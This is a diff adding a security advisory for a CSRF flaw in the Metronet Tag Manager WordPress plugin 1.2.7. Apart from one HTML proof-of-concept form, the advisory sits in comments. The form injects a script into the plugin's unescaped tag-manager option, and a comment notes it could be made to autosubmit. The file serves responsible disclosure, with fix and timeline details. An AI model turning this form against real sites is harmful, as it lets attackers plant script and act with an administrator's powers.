@@ -1,0 +1,62 @@
+<!--
+Details
+================
+Software: Metronet Tag Manager
+Version: 1.2.7
+Homepage: https://wordpress.org/plugins/metronet-tag-manager/
+Advisory report: https://advisories.dxw.com/advisories/csrf-metronet-tag-manager/
+CVE: Awaiting assignment
+CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)
+
+Description
+================
+CSRF in Metronet Tag Manager allows anybody to do almost anything an admin can
+
+Vulnerability
+================
+The pluginas settings page sends a nonce, and checks it when displaying the success/failure message, but is not checked when setting options.
+This option is meant to contain JavaScript for Google Tag Manager, so itas displayed on every frontend page without escaping.
+As this vulnerability allows adding arbitrary JavaScript, the attacker can use it to control an admin useras browser to do almost anything an admin user can do.
+
+Proof of concept
+================
+-->
+
+Press submit on a page containing the following HTML snippet:
+<form method=\"POST\" action=\"http://localhost/wp-admin/options-general.php?page=metronet-tag-manager\">
+ <input type=\"text\" name=\"submit\" value=\"1\">
+ <input type=\"text\" name=\"gtm-code-head\" value=\"<script>alert(1)</script>\">
+ <input type=\"submit\">
+</form>
+
+<!--
+In a real attack, the form can be made to autosubmit so the victim only has to follow a link.
+
+Mitigations
+================
+Upgrade to version 1.2.9 or later.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2018-04-13: Discovered
+2018-04-16: Reported to plugin author via Facebook private message
+2018-04-17: Plugin author confirmed receipt of message
+2018-04-24: Plugin changelog indicates bug has been fixed in 1.2.9
+2018-05-15: Advisory published
+
+
+
+Discovered by dxw:
+================
+Tom Adams
+Please visit security.dxw.com for more information.
+-->
